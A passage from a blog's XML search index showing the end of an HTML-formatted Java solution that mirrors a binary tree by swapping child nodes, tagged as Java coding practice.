Mirror(pRoot.right);</span><br><span class="line">        <span class="comment">//交换</span></span><br><span class="line">        pRoot.left = right; </span><br><span class="line">        pRoot.right = left;</span><br><span class="line">        <span class="keyword">return</span> pRoot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>刷题</tag>
      </tags>
  </entry>
</search>
